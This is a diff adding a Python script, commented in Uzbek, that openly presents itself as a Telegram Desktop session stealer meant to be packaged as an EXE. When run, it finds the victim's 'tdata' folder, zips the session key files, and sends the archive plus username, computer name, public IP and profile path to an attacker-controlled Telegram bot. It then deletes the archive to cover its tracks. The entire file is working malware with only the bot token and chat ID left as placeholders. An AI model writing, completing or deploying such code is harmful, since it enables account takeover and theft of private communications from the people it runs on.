@@ -1,0 +1,247 @@
+import os
+
+import sys
+
+import zipfile
+
+import requests
+
+import time
+
+import threading
+
+from pathlib import Path
+
+import subprocess
+
+import psutil
+
+
+
+# KONFIGURATSIYA - O'ZINGIZNIKINI QO'YING
+
+BOT_TOKEN = "bot token "
+
+CHAT_ID = "CHAT ID "
+
+
+
+def get_system_info():
+
+    """Tizim haqida ma'lumot"""
+
+    try:
+
+        username = os.getlogin()
+
+        computername = os.getenv('COMPUTERNAME', 'Unknown')
+
+        userprofile = os.getenv('USERPROFILE', '')
+
+        ip = requests.get('https://api.ipify.org', timeout=5).text if requests else 'Unknown'
+
+        return f"👤 {username}\n💻 {computername}\n🌐 IP: {ip}\n📁 Profile: {userprofile}"
+
+    except:
+
+        return "Unknown"
+
+
+
+def send_message(text):
+
+    """Telegram xabar yuborish"""
+
+    try:
+
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+        requests.post(url,
+
+                     data={'chat_id': CHAT_ID, 'text': text, 'disable_web_page_preview': True},
+
+                     timeout=10)
+
+    except:
+
+        pass
+
+
+
+def send_file(file_path):
+
+    """Fayl yuborish"""
+
+    try:
+
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+
+        with open(file_path, 'rb') as f:
+
+            files = {'document': (file_path.name, f, 'application/zip')}
+
+            caption = f"✅ TDATA STEALED\n{get_system_info()}"
+
+            requests.post(url, files=files, data={'chat_id': CHAT_ID, 'caption': caption}, timeout=30)
+
+        return True
+
+    except:
+
+        return False
+
+
+
+def get_tdata_path():
+
+    """Telegram tdata yo'lini topish"""
+
+    paths = [
+
+        Path(os.getenv('APPDATA')) / "Telegram Desktop" / "tdata",
+
+        Path(os.getenv('LOCALAPPDATA')) / "Telegram Desktop" / "tdata",
+
+        Path(os.getenv('USERPROFILE')) / "AppData" / "Roaming" / "Telegram Desktop" / "tdata"
+
+    ]
+
+    for path in paths:
+
+        if path.exists():
+
+            return path
+
+    return None
+
+
+
+def create_tdata_zip():
+
+    """Tdata zip yaratish"""
+
+    tdata_path = get_tdata_path()
+
+    if not tdata_path:
+
+        return None
+
+   
+
+    temp_dir = Path(os.getenv('TEMP', os.getenv('TMP', '/tmp')))
+
+    zip_path = temp_dir / f"tdata_{int(time.time())}.zip"
+
+   
+
+    try:
+
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as z:
+
+            for root, dirs, files in os.walk(tdata_path):
+
+                # Keraksiz papkalarni o'tkazib yuborish
+
+                dirs[:] = [d for d in dirs if d not in ['.git', '__pycache__', 'node_modules']]
+
+               
+
+                for file in files:
+
+                    if len(file) > 8 or file in ['key_datas', 'map', 'user_data', 'settings0']:
+
+                        file_path = Path(root) / file
+
+                        if file_path.exists() and file_path.stat().st_size > 0:
+
+                            try:
+
+                                arcname = file_path.relative_to(tdata_path.parent)
+
+                                z.write(file_path, arcname)
+
+                            except:
+
+                                continue
+
+        return zip_path if zip_path.exists() else None
+
+    except:
+
+        return None
+
+
+
+def cleanup(file_path):
+
+    """Tozalash"""
+
+    try:
+
+        time.sleep(3)
+
+        if file_path.exists():
+
+            file_path.unlink()
+
+    except:
+
+        pass
+
+
+
+def main():
+
+    """Asosiy funksiya - EXE ochilganda darhol ishga tushadi"""
+
+   
+
+    # Darhol status yuborish
+
+    send_message("🚀 Stealer ACTIVE\n" + get_system_info())
+
+   
+
+    # Tdata zip yaratish
+
+    archive = create_tdata_zip()
+
+   
+
+    if archive and archive.exists():
+
+        # Fayl yuborish
+
+        if send_file(archive):
+
+            send_message("✅ TDATA SUCCESSFULLY EXFILTRATED")
+
+        else:
+
+            send_message("❌ FILE SEND FAILED")
+
+       
+
+        # Tozalash (background thread)
+
+        threading.Thread(target=cleanup, args=(archive,), daemon=True).start()
+
+    else:
+
+        send_message("❌ TDATA NOT FOUND")
+
+
+
+if __name__ == "__main__":
+
+    # EXE sifatida ishlaganda ko'rinmaslik uchun
+
+    if getattr(sys, 'frozen', False):
+
+        # PyInstaller bilan yaratilgan
+
+        main()
+
+    else:
+
+        main()
